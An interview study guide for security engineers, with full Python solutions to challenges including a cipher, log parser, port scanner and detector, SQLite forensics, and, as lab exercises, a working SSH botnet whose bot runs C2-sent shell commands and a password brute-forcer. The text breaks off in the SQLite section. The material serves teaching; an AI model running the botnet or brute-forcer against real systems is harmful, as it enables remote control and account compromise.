# Security Themed Coding Challenges - Deep Dive

[Back to Main Notes](../interview-study-notes-for-security-engineering.md#security-themed-coding-challenges)

> **Prerequisites:** [Coding & Algorithms](coding-algorithms.md), Python basics  
> **Difficulty:** Intermediate to Advanced

> **Disclaimer:** Every tool and technique in this guide is presented strictly for educational purposes and authorized security testing. Never run these tools against systems you do not own or have explicit written permission to test. Unauthorized use may violate computer fraud and abuse laws in your jurisdiction.

---

## Table of Contents

1. [Emoji Cipher -- Implement a Custom Encryption Algorithm](#1-emoji-cipher----implement-a-custom-encryption-algorithm)
2. [Log Parser -- Collect and Analyze Arbitrary Logs](#2-log-parser----collect-and-analyze-arbitrary-logs)
3. [Web Scraper -- Extract Information from Websites](#3-web-scraper----extract-information-from-websites)
4. [Port Scanner -- Write and Detect Port Scanning](#4-port-scanner----write-and-detect-port-scanning)
5. [SSH Botnet Design -- Architecture and Command-and-Control](#5-ssh-botnet-design----architecture-and-command-and-control)
6. [Password Brute-Forcer -- Credential Generation and Testing](#6-password-brute-forcer----credential-generation-and-testing)
7. [PDF Metadata Scraper -- Forensics Tool for Document Metadata](#7-pdf-metadata-scraper----forensics-tool-for-document-metadata)
8. [Recover Deleted Items -- Database Forensics](#8-recover-deleted-items----database-forensics)
9. [Malware Signature Scanner -- Binary Analysis and YARA Rules](#9-malware-signature-scanner----binary-analysis-and-yara-rules)

---

## 1. Emoji Cipher -- Implement a Custom Encryption Algorithm

### Challenge Description

Build a cipher that converts plaintext into emoji sequences and back. Forces reasoning about substitution ciphers, key management, and the boundary between encoding and encryption.

### Learning Objectives

- Understand the difference between encoding, hashing, and encryption.
- Implement a substitution cipher with a keyed shuffle.
- Reason about the weaknesses of monoalphabetic substitution (frequency analysis).
- Practice key derivation and deterministic randomness from a seed.

### Complete Solution

```python
"""Emoji Cipher -- Complete Educational Implementation"""
import random
import hashlib

CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .,!?;:'-\"@#$%&()"
EMOJIS = [chr(cp) for cp in range(0x1F600, 0x1F600 + len(CHARSET))]


def build_substitution_table(key: str) -> dict:
    """Seed a PRNG with the key hash and produce a shuffled mapping."""
    seed = int(hashlib.sha256(key.encode()).hexdigest(), 16)
    rng = random.Random(seed)
    shuffled = list(EMOJIS)
    rng.shuffle(shuffled)
    return {ch: em for ch, em in zip(CHARSET, shuffled)}


def invert_table(table: dict) -> dict:
    return {v: k for k, v in table.items()}


def encrypt(plaintext: str, key: str) -> str:
    table = build_substitution_table(key)
    return "".join(table.get(ch, ch) for ch in plaintext)


def decrypt(ciphertext: str, key: str) -> str:
    table = build_substitution_table(key)
    rev = invert_table(table)
    result = []
    for ch in ciphertext:
        result.append(rev.get(ch, ch))
    return "".join(result)


def encrypt_polyalphabetic(plaintext: str, key: str) -> str:
    """Vigenere-style: rotate substitution table per position."""
    result = []
    for i, ch in enumerate(plaintext):
        positional_key = f"{key}-{i % len(key)}"
        table = build_substitution_table(positional_key)
        result.append(table.get(ch, ch))
    return "".join(result)


def decrypt_polyalphabetic(ciphertext: str, key: str) -> str:
    result = []
    for i, ch in enumerate(ciphertext):
        positional_key = f"{key}-{i % len(key)}"
        table = build_substitution_table(positional_key)
        rev = invert_table(table)
        result.append(rev.get(ch, ch))
    return "".join(result)


if __name__ == "__main__":
    message = "Attack at dawn!"
    secret = "my-secret-key"

    # Simple substitution
    enc = encrypt(message, secret)
    dec = decrypt(enc, secret)
    print(f"Original:    {message}")
    print(f"Encrypted:   {enc}")
    print(f"Decrypted:   {dec}")
    assert dec == message

    # Polyalphabetic
    enc_poly = encrypt_polyalphabetic(message, secret)
    dec_poly = decrypt_polyalphabetic(enc_poly, secret)
    print(f"\nPoly-Encrypted: {enc_poly}")
    print(f"Poly-Decrypted: {dec_poly}")
    assert dec_poly == message
    print("\nAll assertions passed.")
```

### Extensions

- Implement frequency analysis to break the simple substitution mode automatically.
- Add an HMAC tag so the receiver can verify message integrity.

### Interview Relevance

- Demonstrates understanding of the cryptographic hierarchy (encoding vs. encryption vs. hashing).
- Shows ability to implement keyed algorithms and articulate why simple substitution is insecure.

### References

- [Python `random` module -- seeded PRNG](https://docs.python.org/3/library/random.html)
- [Practical Cryptography -- Substitution Cipher](http://practicalcryptography.com/ciphers/simple-substitution-cipher/)

---

## 2. Log Parser -- Collect and Analyze Arbitrary Logs

### Challenge Description

Build a tool that ingests raw log files (syslog, Apache, Windows event logs) and extracts security-relevant fields: IPs, domains, paths, timestamps, and user agents.

### Learning Objectives

- Write robust regular expressions for security-relevant patterns.
- Handle multiple log formats without hardcoding assumptions.
- Produce structured output (JSON, CSV) suitable for downstream analysis.
- Understand common log sources used in incident response.

### Complete Solution

```python
"""Log Parser -- Complete Educational Implementation"""
import re
import json
import sys
from collections import Counter, defaultdict
from datetime import datetime

PATTERNS = {
    "ipv4": re.compile(
        r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}"
        r"(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b"
    ),
    "ipv6": re.compile(
        r"\b(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}\b"
    ),
    "domain": re.compile(
        r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+"
        r"(?:com|net|org|io|gov|edu|mil|co|info|biz|xyz|ru|cn|uk|de)\b"
    ),
    "email": re.compile(
        r"\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b"
    ),
    "unix_path": re.compile(
        r"(?:/(?:usr|etc|var|tmp|opt|home|bin|sbin|lib)"
        r"(?:/[\w.\-]+)+)"
    ),
    "windows_path": re.compile(
        r"[A-Z]:\\(?:[\w.\- ]+\\)*[\w.\- ]+\.(?:exe|dll|bat|ps1|cmd|vbs|js)",
        re.IGNORECASE,
    ),
    "timestamp_iso": re.compile(
        r"\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?\b"
    ),
    "timestamp_syslog": re.compile(
        r"\b(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)"
        r"\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}\b"
    ),
    "url": re.compile(
        r"https?://[^\s\"'<>]+", re.IGNORECASE
    ),
    "md5": re.compile(r"\b[a-fA-F0-9]{32}\b"),
    "sha256": re.compile(r"\b[a-fA-F0-9]{64}\b"),
}

INTERNAL_RANGES = {"127.0.0.1", "0.0.0.0", "255.255.255.255"}


def parse_line(line: str) -> dict:
    """Extract all artifacts from a single log line."""
    findings = {}
    for name, pattern in PATTERNS.items():
        matches = pattern.findall(line)
        if matches:
            findings[name] = matches
    return findings


def parse_file(filepath: str) -> dict:
    """Parse an entire log file and return a structured report."""
    counters = defaultdict(Counter)
    total_lines = 0

    with open(filepath, "r", errors="replace") as f:
        for line in f:
            total_lines += 1
            findings = parse_line(line)
            for artifact_type, values in findings.items():
                for v in values:
                    counters[artifact_type][v] += 1

    report = {
        "file": filepath,
        "total_lines": total_lines,
        "artifacts": {},
        "summary": {},
    }
    for artifact_type, counter in counters.items():
        report["artifacts"][artifact_type] = dict(counter.most_common())
        report["summary"][artifact_type] = {
            "unique_count": len(counter),
            "total_occurrences": sum(counter.values()),
            "top_5": counter.most_common(5),
        }
    return report


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python log_parser.py <logfile>")
        sys.exit(1)
    report = parse_file(sys.argv[1])
    print(json.dumps(report, indent=2, default=str))
```

### Extensions

- Add GeoIP lookups using the `geoip2` library to enrich IP addresses with country and ASN data.
- Implement a streaming mode that tails a live log file and emits alerts when new IOCs are seen.

### Interview Relevance

- Proves you can write regex under pressure and handle messy real-world data.
- FAANG security teams frequently ask candidates to parse sample logs and extract IOCs live.

### References

- [Python `re` module documentation](https://docs.python.org/3/library/re.html)
- [Sigma Rules Project (log-based detection)](https://github.com/SigmaHQ/sigma)

---

## 3. Web Scraper -- Extract Information from Websites

### Challenge Description

Build a scraper that extracts security-relevant data from web pages: emails, directory listings, technology fingerprints from headers/metadata, and linked scripts. Core reconnaissance skill for both red and blue teams.

### Learning Objectives

- Understand HTTP request/response lifecycle and header analysis.
- Parse HTML with a DOM parser; identify information leakage in web applications.
- Respect `robots.txt` and rate limiting.

### Complete Solution

```python
"""Web Scraper -- Educational Implementation (authorized targets only)"""
import re
import json
import sys
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

USER_AGENT = "Mozilla/5.0 (educational-security-scraper/1.0)"

SECURITY_HEADERS = [
    "Strict-Transport-Security", "Content-Security-Policy",
    "X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy",
]


def fetch_page(url: str, timeout: int = 10) -> requests.Response:
    """Fetch a page with a realistic User-Agent and timeout."""
    headers = {"User-Agent": USER_AGENT}
    response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=True)
    response.raise_for_status()
    return response


def extract_emails(soup: BeautifulSoup, raw_text: str) -> set:
    """Extract email addresses from both HTML and raw text."""
    email_re = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
    emails = set()
    for a_tag in soup.find_all("a", href=True):
        if a_tag["href"].startswith("mailto:"):
            addr = a_tag["href"].replace("mailto:", "").split("?")[0]
            emails.add(addr.lower())
    emails.update(m.lower() for m in email_re.findall(raw_text))
    return emails


def extract_links(soup: BeautifulSoup, base_url: str) -> dict:
    """Extract and categorize all links on the page."""
    links = {"internal": set(), "external": set(), "scripts": set(), "forms": set()}
    base_domain = urlparse(base_url).netloc

    for a_tag in soup.find_all("a", href=True):
        full_url = urljoin(base_url, a_tag["href"])
        if urlparse(full_url).netloc == base_domain:
            links["internal"].add(full_url)
        else:
            links["external"].add(full_url)

    for script in soup.find_all("script", src=True):
        links["scripts"].add(urljoin(base_url, script["src"]))

    for form in soup.find_all("form", action=True):
        links["forms"].add(urljoin(base_url, form["action"]))

    return {k: sorted(v) for k, v in links.items()}


def extract_meta(soup: BeautifulSoup) -> dict:
    """Extract meta tags that reveal technology or configuration."""
    meta_info = {}
    for tag in soup.find_all("meta"):
        name = tag.get("name", tag.get("property", ""))
        content = tag.get("content", "")
        if name and content:
            meta_info[name] = content
    gen = soup.find("meta", attrs={"name": "generator"})
    if gen:
        meta_info["generator"] = gen.get("content", "")
    return meta_info


def analyze_headers(response: requests.Response) -> dict:
    """Analyze response headers for security posture and fingerprinting."""
    report = {"server": response.headers.get("Server", "Not disclosed")}
    present = {}
    missing = []
    for header in SECURITY_HEADERS:
        value = response.headers.get(header)
        if value:
            present[header] = value
        else:
            missing.append(header)
    report["security_headers_present"] = present
    report["security_headers_missing"] = missing
    report["all_headers"] = dict(response.headers)
    return report


def scrape(url: str) -> dict:
    """Full scrape of a single target URL."""
    try:
        resp = fetch_page(url)
    except requests.RequestException as e:
        return {url: {"error": str(e)}}

    soup = BeautifulSoup(resp.text, "html.parser")
    return {url: {
        "status_code": resp.status_code,
        "emails": sorted(extract_emails(soup, resp.text)),
        "links": extract_links(soup, url),
        "meta": extract_meta(soup),
        "headers": analyze_headers(resp),
        "title": soup.title.string.strip() if soup.title and soup.title.string else None,
    }}


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python web_scraper.py <url>")
        sys.exit(1)
    print(json.dumps(scrape(sys.argv[1]), indent=2, default=str))
```

### Extensions

- Add `robots.txt` parsing to discover disallowed paths (often interesting from a recon perspective).
- Implement JavaScript rendering using `selenium` or `playwright` for SPAs.

### Interview Relevance

- Shows ability to automate OSINT, understand HTTP at a protocol level, and identify security misconfigurations.
- Demonstrates responsible tooling with rate limiting and scope control.

### References

- [BeautifulSoup documentation](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)
- [OWASP -- Information Gathering](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/)

---

## 4. Port Scanner -- Write and Detect Port Scanning

### Challenge Description

Build a TCP port scanner from scratch, then build a detector that identifies scanning activity in network logs. Covers both offensive and defensive sides of network security.

### Learning Objectives

- Understand TCP three-way handshake; SYN scan vs. connect scan vs. banner grab.
- Implement concurrent network I/O with threading or asyncio.
- Build detection logic for scan signatures (sequential ports, high connection rates).

### Complete Solution

```python
"""Port Scanner and Scan Detector -- Educational Implementation"""
import socket
import sys
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime

COMMON_SERVICES = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 3306: "MySQL",
    3389: "RDP", 5432: "PostgreSQL", 6379: "Redis", 8080: "HTTP-Alt",
    8443: "HTTPS-Alt", 27017: "MongoDB",
}


def scan_port(host: str, port: int, timeout: float = 1.0) -> dict:
    """Attempt a TCP connect scan on a single port."""
    result = {"port": port, "state": "closed", "service": COMMON_SERVICES.get(port, "unknown")}
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        if sock.connect_ex((host, port)) == 0:
            result["state"] = "open"
            try:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                result["banner"] = sock.recv(1024).decode("utf-8", errors="replace").strip()[:200]
            except (socket.timeout, OSError):
                pass
        sock.close()
    except (socket.timeout, OSError):
        result["state"] = "filtered"
    return result


def scan_host(host: str, ports: list, max_workers: int = 100, timeout: float = 1.0) -> list:
    """Scan multiple ports concurrently using a thread pool."""
    results = []
    start_time = time.time()

    try:
        resolved_ip = socket.gethostbyname(host)
    except socket.gaierror:
        print(f"Error: Cannot resolve hostname '{host}'")
        return results

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(scan_port, resolved_ip, p, timeout): p for p in ports}
        for future in as_completed(futures):
            result = future.result()
            if result["state"] == "open":
                results.append(result)
                print(f"  {result['port']:>5}/tcp  open  {result['service']:<15} {result['banner'][:60]}")

    elapsed = time.time() - start_time
    results.sort(key=lambda r: r["port"])
    print(f"\nScan completed in {elapsed:.2f}s -- {len(results)} open ports found")
    return results


def detect_scans(log_lines: list, threshold_ports: int = 15, window_seconds: int = 60) -> list:
    """Detect port scanning from connection log entries.
    Expects log lines: "timestamp src_ip dst_ip dst_port status"
    """
    connections = defaultdict(list)
    for line in log_lines:
        parts = line.strip().split()
        if len(parts) < 5:
            continue
        ts_str, src_ip, dst_ip, dst_port, status = parts[:5]
        try:
            ts = datetime.fromisoformat(ts_str)
            port = int(dst_port)
        except (ValueError, TypeError):
            continue
        connections[(src_ip, dst_ip)].append({"timestamp": ts, "port": port, "status": status})

    alerts = []
    for (src, dst), conns in connections.items():
        conns.sort(key=lambda c: c["timestamp"])
        for i, conn in enumerate(conns):
            window_start = conn["timestamp"]
            window_ports = set()
            for j in range(i, len(conns)):
                delta = (conns[j]["timestamp"] - window_start).total_seconds()
                if delta > window_seconds:
                    break
                window_ports.add(conns[j]["port"])
            if len(window_ports) >= threshold_ports:
                alerts.append({
                    "src_ip": src,
                    "dst_ip": dst,
                    "unique_ports": len(window_ports),
                    "window_start": str(window_start),
                    "severity": "HIGH" if len(window_ports) > 100 else "MEDIUM",
                })
                break  # One alert per pair is enough

    return alerts


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python port_scanner.py scan|detect <host|logfile> [start_port] [end_port]")
        sys.exit(1)

    if sys.argv[1] == "scan":
        host = sys.argv[2]
        start_p = int(sys.argv[3]) if len(sys.argv) > 3 else 1
        end_p = int(sys.argv[4]) if len(sys.argv) > 4 else 1024
        results = scan_host(host, list(range(start_p, end_p + 1)))
        print(json.dumps(results, indent=2))
    elif sys.argv[1] == "detect":
        with open(sys.argv[2]) as f:
            alerts = detect_scans(f.readlines())
        print(json.dumps(alerts, indent=2))
```

### Extensions

- Implement a SYN scan using `scapy` (requires root/admin privileges).
- Add OS fingerprinting based on TTL and TCP window size.

### Interview Relevance

- Staple interview topic: explain SYN vs. connect scans, describe IDS/IPS detection of scanning.
- Building both sides (scanner + detector) gives concrete answers for whiteboard questions.

### References

- [Python `socket` module](https://docs.python.org/3/library/socket.html)
- [Nmap reference guide](https://nmap.org/book/man.html)

---

## 5. SSH Botnet Design -- Architecture and Command-and-Control

### Challenge Description

Design and implement (in a sandboxed lab) an SSH-based botnet: C2 server, bot registration, command dispatch, and result exfiltration. **Lab exercise only -- never deploy outside an isolated test environment.**

### Learning Objectives

- Understand botnet architecture: C2 server, bots, command channels, exfiltration.
- Learn how SSH can be used as an encrypted C2 channel.
- Reason about detection and defense from the defender's perspective.

### Complete Solution

```python
"""SSH Botnet -- Educational Implementation (LAB ONLY)"""
import json
import socket
import threading
import time
import platform
import subprocess
import logging
from datetime import datetime

import paramiko

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("botnet-lab")
HOST_KEY = paramiko.RSAKey.generate(2048)


class C2Server:
    """Minimal command-and-control server over SSH."""

    def __init__(self, bind_addr: str = "127.0.0.1", port: int = 2222):
        self.bind_addr = bind_addr
        self.port = port
        self.bots = {}  # bot_id -> (channel, info)

    def start(self):
        """Start listening for bot connections."""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.bind_addr, self.port))
        server_socket.listen(10)
        logger.info(f"C2 listening on {self.bind_addr}:{self.port}")
        while True:
            client_sock, addr = server_socket.accept()
            threading.Thread(target=self._handle_bot, args=(client_sock, addr), daemon=True).start()

    def _handle_bot(self, client_sock, addr):
        transport = paramiko.Transport(client_sock)
        transport.add_server_key(HOST_KEY)
        try:
            transport.start_server(server=LabSSHServer())
        except paramiko.SSHException:
            return
        channel = transport.accept(timeout=20)
        if not channel:
            return
        raw = channel.recv(4096).decode("utf-8", errors="replace")
        info = json.loads(raw) if raw.startswith("{") else {"raw": raw}
        bot_id = info.get("bot_id", f"bot-{addr[0]}")
        self.bots[bot_id] = (channel, info)
        logger.info(f"Bot registered: {bot_id}")

    def dispatch_command(self, bot_id: str, command: str) -> str:
        if bot_id not in self.bots:
            return f"Bot {bot_id} not found"
        channel, _ = self.bots[bot_id]
        try:
            channel.sendall(json.dumps({"cmd": command}).encode() + b"\n")
            return channel.recv(65536).decode("utf-8", errors="replace")
        except Exception as e:
            return f"Error: {e}"


class LabSSHServer(paramiko.ServerInterface):
    """Minimal SSH server interface for lab use."""

    def check_auth_password(self, username, password):
        if username == "bot" and password == "lab-password-only":
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED


class BotClient:
    """Minimal bot that connects to C2 and executes commands."""

    def __init__(self, c2_host: str = "127.0.0.1", c2_port: int = 2222):
        self.c2_host = c2_host
        self.c2_port = c2_port

    def connect_and_run(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.c2_host, port=self.c2_port, username="bot", password="lab-password-only")
        channel = client.get_transport().open_session()

        channel.sendall(json.dumps({
            "bot_id": platform.node(), "os": platform.platform(),
        }).encode())

        while True:
            try:
                data = channel.recv(4096)
                if not data:
                    break
                cmd = json.loads(data.decode()).get("cmd", "")
                if cmd.lower() == "exit":
                    break
                try:
                    output = subprocess.check_output(
                        cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
                    ).decode("utf-8", errors="replace")
                except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
                    output = f"Error: {e}"
                channel.sendall(output.encode())
            except Exception:
                break
        channel.close()
        client.close()


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2 or sys.argv[1] not in ("server", "bot"):
        print("Usage: python ssh_botnet.py server|bot [c2_host] [c2_port]")
        sys.exit(1)
    if sys.argv[1] == "server":
        C2Server().start()
    else:
        BotClient(
            sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1",
            int(sys.argv[3]) if len(sys.argv) > 3 else 2222
        ).connect_and_run()
```

### Extensions

- Implement command queuing so offline bots receive commands when they reconnect.
- Build a detection script that parses `/var/log/auth.log` for bot-like SSH patterns (repeated connections, unusual usernames, rapid reconnects).

### Interview Relevance

- Critical for threat intelligence and IR roles: describe botnet architecture, detect C2 traffic, explain SSH abuse.
- Lab experience gives concrete answers rather than theoretical ones.

### References

- [Paramiko documentation](https://www.paramiko.org/)
- [MITRE ATT&CK -- Command and Control](https://attack.mitre.org/tactics/TA0011/)

---

## 6. Password Brute-Forcer -- Credential Generation and Testing

### Challenge Description

Build a tool that generates credential combinations from wordlists and tests them against a local authentication service (included dummy Flask app). Implements rate-limit awareness and result storage. **Only test against services you own.**

### Learning Objectives

- Understand credential stuffing vs. password spraying and lockout policy impacts.
- Implement concurrent HTTP requests with proper session handling.
- Practice rate-limit awareness and secure credential storage.

### Complete Solution

```python
"""Password Brute-Forcer -- Complete Educational Implementation
Only use against authentication endpoints you own and control.
"""
import json
import sys
import time
import hashlib
import itertools
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests

# NOTE: Test against a dummy Flask login endpoint you control (POST /login with JSON {username, password})

class BruteForcer:
    """Concurrent credential testing engine."""

    def __init__(self, target_url: str, max_workers: int = 10):
        self.target_url = target_url
        self.max_workers = max_workers
        self.successful = []
        self.attempts = 0
        self.lock = threading.Lock()
        self.rate_limited = False
        self.start_time = None

    @staticmethod
    def load_wordlist(filepath: str) -> list:
        """Load a wordlist file, stripping whitespace and skipping comments."""
        entries = []
        with open(filepath, "r", errors="replace") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    entries.append(line)
        return entries

    @staticmethod
    def generate_credentials(usernames: list, passwords: list):
        """Generate all (username, password) combinations."""
        return itertools.product(usernames, passwords)

    def try_login(self, username: str, password: str) -> dict:
        """Attempt a single login against the target."""
        result = {"username": username, "password": password, "success": False}
        try:
            resp = requests.post(self.target_url,
                                 json={"username": username, "password": password}, timeout=10)
            if resp.status_code == 429:
                with self.lock:
                    self.rate_limited = True
                return result
            if resp.status_code == 200 and resp.json().get("status") == "success":
                result["success"] = True
        except requests.RequestException:
            pass
        with self.lock:
            self.attempts += 1
        return result

    def run(self, usernames: list, passwords: list) -> list:
        """Execute the brute-force attack with concurrency and rate-limit awareness."""
        self.start_time = time.time()
        creds = list(self.generate_credentials(usernames, passwords))

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {}
            for username, password in creds:
                if self.rate_limited:
                    time.sleep(30)
                    self.rate_limited = False
                futures[executor.submit(self.try_login, username, password)] = (username, password)

            for future in as_completed(futures):
                result = future.result()
                if result["success"]:
                    self.successful.append(result)
                    print(f"  [+] SUCCESS: {result['username']}:{result['password']}")

        return self.successful

    def save_results(self, filepath: str):
        """Save successful credentials to a JSON file."""
        with open(filepath, "w") as f:
            json.dump({"target": self.target_url, "attempts": self.attempts,
                       "successful": self.successful}, f, indent=2)


if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python brute_forcer.py <target_url> <usernames_file> <passwords_file>")
        sys.exit(1)

    bf = BruteForcer(sys.argv[1])
    bf.run(bf.load_wordlist(sys.argv[2]), bf.load_wordlist(sys.argv[3]))
    bf.save_results("brute_force_results.json")
```

### Extensions

- Add password spraying mode (one password against all users before moving to the next) to avoid lockouts.
- Implement credential mutation rules (capitalize first letter, append `123`, leet-speak substitutions).

### Interview Relevance

- Discuss account lockout policies, CAPTCHA, MFA, and credential stuffing detection from hands-on experience.
- Explain how password spraying differs from brute forcing and why defenders care.

### References

- [OWASP -- Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing)
- [SecLists -- Common Wordlists](https://github.com/danielmiessler/SecLists)

---

## 7. PDF Metadata Scraper -- Forensics Tool for Document Metadata

### Challenge Description

Build a forensic tool that extracts PDF metadata: author names, creation dates, software used, embedded fonts, and hidden objects. Document metadata can reveal internal usernames, software versions, and organizational structure.

### Learning Objectives

- Understand PDF file structure and metadata standards (XMP, Info dictionary).
- Perform OSINT using document metadata; recognize metadata as a data leakage vector.
- Extract and analyze embedded objects in PDFs.

### Complete Solution

```python
"""PDF Metadata Scraper -- Complete Educational Implementation"""
import json
import os
import sys
import hashlib
from datetime import datetime
from pathlib import Path

from PyPDF2 import PdfReader


def file_hashes(filepath: str) -> dict:
    """Compute MD5 and SHA256 hashes for the file."""
    md5 = hashlib.md5()
    sha256 = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            md5.update(chunk)
            sha256.update(chunk)
    return {"md5": md5.hexdigest(), "sha256": sha256.hexdigest()}


def extract_metadata_pypdf2(pdf_path: str) -> dict:
    """Extract metadata using PyPDF2."""
    reader = PdfReader(pdf_path)
    meta = reader.metadata or {}

    info = {
        "title": meta.get("/Title", ""),
        "author": meta.get("/Author", ""),
        "subject": meta.get("/Subject", ""),
        "creator": meta.get("/Creator", ""),
        "producer": meta.get("/Producer", ""),
        "creation_date": str(meta.get("/CreationDate", "")),
        "modification_date": str(meta.get("/ModDate", "")),
        "keywords": meta.get("/Keywords", ""),
        "trapped": str(meta.get("/Trapped", "")),
    }

    # Page info
    info["num_pages"] = len(reader.pages)
    info["encrypted"] = reader.is_encrypted

    custom = {}
    for key, value in meta.items():
        if key not in ("/Title", "/Author", "/Subject", "/Creator",
                       "/Producer", "/CreationDate", "/ModDate", "/Keywords", "/Trapped"):
            custom[key] = str(value)
    info["custom_metadata"] = custom

    embedded_objects = []
    for page_num, page in enumerate(reader.pages):
        if "/XObject" in page.get("/Resources", {}):
            for obj_name in page["/Resources"]["/XObject"]:
                embedded_objects.append({"page": page_num + 1, "name": str(obj_name)})
    info["embedded_objects"] = embedded_objects

    return info


def full_forensic_report(pdf_path: str) -> dict:
    """Generate a comprehensive forensic metadata report."""
    stat = os.stat(pdf_path)
    pdf_info = extract_metadata_pypdf2(pdf_path)

    observations = []
    for field in ("author", "creator", "producer"):
        if pdf_info[field]:
            observations.append(f"{field}: '{pdf_info[field]}'")
    if pdf_info["embedded_objects"]:
        observations.append(f"{len(pdf_info['embedded_objects'])} embedded objects detected")

    return {
        "file": {"path": os.path.abspath(pdf_path), "size_bytes": stat.st_size,
                 "hashes": file_hashes(pdf_path)},
        "pdf_info": pdf_info,
        "security_observations": observations,
    }


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python pdf_metadata.py <file.pdf>")
        sys.exit(1)
    report = full_forensic_report(sys.argv[1])
    print(json.dumps(report, indent=2, default=str))
```

### Extensions

- Extract embedded images and run EXIF analysis (GPS coordinates, camera model).
- Detect JavaScript or action triggers embedded in the PDF (common malware delivery vector).

### Interview Relevance

- Explain what metadata PDFs leak, how to extract it programmatically, and how to sanitize documents.
- Relevant to incident response, OSINT, and data loss prevention (DLP) discussions.

### References

- [PyPDF2 documentation](https://pypdf2.readthedocs.io/)
- [pikepdf documentation](https://pikepdf.readthedocs.io/)

---

## 8. Recover Deleted Items -- Database Forensics

### Challenge Description

Build a forensic tool that recovers deleted records from SQLite databases. SQLite marks deleted pages as free without overwriting data -- your tool finds and recovers these remnants from browsers, messaging apps, and mobile devices.

### Learning Objectives

- Understand SQLite file format, page structure, and how deletion works at the storage layer.
- Practice binary file parsing and data carving.
- Connect database forensics to IR workflows (browser history, chat logs).

### Complete Solution

```python
"""SQLite Forensic Recovery -- Complete Educational Implementation"""
import json
import os
import re
import struct
import sys


SQLITE_HEADER = b"SQLite format 3\x00"


def validate_sqlite(filepath: str) -> dict:
    """Validate and extract header information from a SQLite database."""
    with open(filepath, "rb") as f:
        header = f.read(100)
    if not header.startswith(SQLITE_HEADER):
        return {"valid": False, "error": "Not a SQLite database"}

    page_size = struct.unpack(">H", header[16:18])[0]
    if page_size == 1:
        page_size = 65536
    return {
        "valid": True,
        "page_size": page_size,
        "page_count": struct.unpack(">I", header[28:32])[0],
        "first_freelist_page": struct.unpack(">I", header[32:36])[0],
        "freelist_page_count": struct.unpack(">I", header[36:40])[0],
    }


def get_freelist_pages(filepath: str, header_info: dict) -> list:
    """Walk the freelist chain and return all free page numbers."""
    free_pages = []
    page_size = header_info["page_size"]
    first_free = header_info["first_freelist_page"]

    if first_free == 0:
        return free_pages

    with open(filepath, "rb") as f:
        current_page = first_free
        visited = set()

        while current_page != 0 and current_page not in visited:
            visited.add(current_page)
            offset = (current_page - 1) * page_size
            f.seek(offset)
            page_data = f.read(page_size)

            if len(page_data) < 8:
                break

            next_trunk = struct.unpack(">I", page_data[0:4])[0]
            leaf_count = struct.unpack(">I", page_data[4:8])[0]
            free_pages.append(current_page)

            for i in range(min(leaf_count, (page_size - 8) // 4)):
                leaf_offset = 8 + i * 4
                leaf_page = struct.unpack(">I", page_data[leaf_offset:leaf_offset + 4])[0]
                if leaf_page > 0:
                    free_pages.append(leaf_page)

            current_page = next_trunk

    return sorted(set(free_pages))


CARVE_PATTERNS = {
    "strings": re.compile(rb"[\x20-\x7e]{6,}"),
    "urls": re.compile(rb"https?://[^\x00\x01-\x1f]{5,200}"),
    "emails": re.compile(rb"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
    "timestamps": re.compile(rb"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}"),
}


def carve_artifacts(data: bytes) -> dict:
